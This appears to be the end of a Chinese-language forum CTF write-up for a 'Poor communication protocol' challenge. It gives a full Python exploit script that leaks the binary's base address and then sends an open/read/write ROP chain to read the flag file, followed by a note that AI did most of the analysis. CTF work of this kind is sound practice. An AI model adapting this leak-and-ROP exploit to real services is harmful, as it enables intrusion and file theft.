
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnkit import *
from pwnkit.osys.linux.ropbox import GadgetBox
import binascii

args = init_pwn_args()
binary = ELF("./bin/server")
args.info.binary = context.binary = binary
args.info.target = {"host": args.host or "example.pwnme", "port": args.port or 9999}

p = remote("127.0.0.1", 8888)

def run(cmd):
    p.sendlineafter(b"> ", cmd)

run(b"hello")
run(b"oracle_unlock")
run(b"register aaa")
run(b"list")

p.recvuntil(b"count=")
num = int(p.recvline())
for i in range(num):
    idx = p.recvline().strip()[2:]
    idx = int(idx)
    log.info("latest idx: %d", idx)

run(f"oracle_leak {idx} 8".encode())
p.recvuntil(b"addr=")
text_leak = p.recvline().strip()
text_leak = int(text_leak, 16)
text_base = text_leak - 0x2e60
plog.address(text_leak=text_leak, text_base=text_base)

gb = GadgetBox(binary)
pop_rdi_ret = text_base + next(gb.search_gadget(["pop rdi", "ret"]))
pop_rsi_r15_ret = text_base + next(gb.search_gadget(["pop rsi", "pop r15", "ret"]))
add_edx_edi_ret = text_base + 0x2a94
# 0x0000000000002a94: add edx, edi; nop; ret;
add_rsp_0xc0_ret = text_base + 0x2a84
# 0x0000000000002a84: add rsp, 0xc0; ret;
open_addr = text_base + binary.plt["open"]
read_addr = text_base + binary.plt["read"]
write_addr = text_base + binary.plt["write"]

""" open/read/write rop """
path_flag = text_base + 0xc000 + 0x10
path_log = path_flag + 15
buf = text_base + 0xc000 + 0x100
# read buf
size = 0x100

payload = b"/home/ctf/flag\x00"
payload += b"/home/ctf/client.log\x00"
payload = payload.ljust(64, b"\x00")
payload += p64(add_rsp_0xc0_ret)
# int fs = open(path, O_RDONLY, NULL)
payload += p64(pop_rdi_ret) + p64(path_flag) # rdi = "/path/to/flag"
payload += p64(pop_rsi_r15_ret) + p64(0) + p64(0) # rsi = 0 == O_RDONLY
payload += p64(open_addr)
# int fs = open(path, O_RWONLY, NULL)
payload += p64(pop_rdi_ret) + p64(path_log) # rdi = "/path/to/flag"
payload += p64(pop_rsi_r15_ret) + p64(1) + p64(0) # rsi = 0 == O_RDONLY
payload += p64(open_addr)
# read(fs, buf, size)
payload += p64(pop_rdi_ret) + p64(0x100) + p64(add_edx_edi_ret) # edx = 0x100
payload += p64(pop_rdi_ret) + p64(5) # rdi = fs
payload += p64(pop_rsi_r15_ret) + p64(buf) + p64(0) # rsi = buf
payload += p64(read_addr)
# write(1, buf, size)
payload += p64(pop_rdi_ret) + p64(6) # rdi = fs
payload += p64(pop_rsi_r15_ret) + p64(buf) + p64(0) # rsi = buf
payload += p64(write_addr)
data = p8(0x41) + p32(len(payload)) + payload
run(f"exechex {idx} 2 {binascii.hexlify(data).decode()}")

p.interactive()
p.close()
```

![图片描述](https://bbs.kanxue.com/upload/attach/202511/857736_H4UV2BM6XZ5WNQ9.webp)

## 总结

整个复现过程，基本上只有 rop 是自己写的，绝大部分的分析过程都是 AI 在做，人工主要是测功能和指导 AI 的分析方向。目前 AI 针对一些比较小的程序，分析效果还是不错的。

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于 2025-11-2 16:59

被Th3S编辑

，原因： 更新

[#漏洞机制](https://bbs.kanxue.com/forum-171-1-181.htm)

[#溢出](https://bbs.kanxue.com/forum-171-1-182.htm)

[#格式化](https://bbs.kanxue.com/forum-171-1-183.htm)

[#题解集锦](https://bbs.kanxue.com/forum-171-1-187.htm)

上传的附件：

- [Poor communication protocol_470c0988c549468d801a348902afa8fa.zip](javascript:void(0);)

  （40.64kb，13次下载）
